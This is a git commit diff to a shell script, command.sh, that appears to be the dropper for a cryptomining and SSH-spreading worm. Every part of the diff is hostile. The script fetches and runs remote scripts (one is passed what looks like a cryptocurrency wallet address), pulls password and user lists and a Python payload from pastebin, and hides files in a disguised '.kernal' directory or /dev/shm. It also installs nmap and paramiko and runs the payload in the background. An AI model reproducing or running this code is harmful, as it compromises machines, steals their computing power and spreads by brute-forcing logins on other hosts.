2957a1c7ca6047e7e63b5807763ca9f1435018e8
x15121525 <68815312+x15121525@users.noreply.github.com>
2020-08-09 12:11:37 +0800

    Update command.sh

--- command.sh
+++ command.sh
@@ -1,20 +1,30 @@
 #!/bin/bash
-curl -o /tmp/test1.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_kill
+curl -o /tmp/test1.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_kill;wget -O /tmp/test1.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/script_kill
 sh /tmp/test1.sh
-curl -o /tmp/test2.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work
+curl -o /tmp/test2.sh -s https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work;wget -O /tmp/test2.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/script_work
 sh /tmp/test2.sh 47c1Gqngx2Reu5HwPqc1uJP3iKJ8xiK9B3QXepN19LQn42jMyBNMhHHBauycpj5uG7EM6ErCKMSuW3W8YXJJgozdT5mMULW
-curl -o /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh
+curl -o /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh;wget -O /tmp/internal.sh https://raw.githubusercontent.com/x15121525/java_testpp/master/internal.sh
 sh /tmp/internal.sh
-sudo apt install nmap -y
-sudo apt install medusa -y
-sudo apt-get update -y
-sudo apt install python3-pip -y
-pip3 install paramiko
-mkdir /tmp/sys
-mkdir /tmp/sys/b
-curl -o /tmp/sys/cmd_1.txt https://pastebin.com/raw/DJuvm8v0
-curl -o /tmp/sys/cmd.txt https://pastebin.com/raw/8uCHeF8k
-curl -o /tmp/sys/pwd.txt https://pastebin.com/raw/UG35FES2
-curl -o /tmp/sys/user_l.txt https://pastebin.com/raw/dkK8bZqn
-curl -o /tmp/sys/sysupdate.py https://pastebin.com/raw/bBVK9Juq
-python3 /tmp/sys/sysupdate.py &
+if [ -z $HOME ]; then
+  mkdir /dev/shm/sys
+  export HOME=/dev/shm/sys
+fi
+mkdir $HOME/.kernal
+mkdir $HOME/.kernal/b
+curl -o $HOME/.kernal/cmd_1.txt https://pastebin.com/raw/DJuvm8v0;wget -O $HOME/cmd_1.txt https://pastebin.com/raw/DJuvm8v0
+curl -o $HOME/.kernal/cmd.txt https://pastebin.com/raw/8uCHeF8k;wget -O $HOME/cmd.txt https://pastebin.com/raw/8uCHeF8k
+curl -o $HOME/.kernal/pwd.txt https://pastebin.com/raw/UG35FES2;wget -O $HOME/pwd.txt https://pastebin.com/raw/UG35FES2
+curl -o $HOME/.kernal/user_l.txt https://pastebin.com/raw/dkK8bZqn;wget -O $HOME/user_l.txt https://pastebin.com/raw/dkK8bZqn
+curl -o $HOME/.kernal/sysupdate.py https://pastebin.com/raw/bBVK9Juq;wget -O $HOME/sysupdate.py https://pastebin.com/raw/bBVK9Juq
+
+if cat /etc/os-release | grep "Ubuntu" ; then
+        sudo apt install nmap -y
+        sudo apt-get update -y
+        sudo apt install python3-pip -y
+        pip3 install paramiko
+else
+        yum -y install nmap
+        yum -y install python3-pip
+        pip3 install paramiko
+fi
+python3 $HOME/.kernal/sysupdate.py &
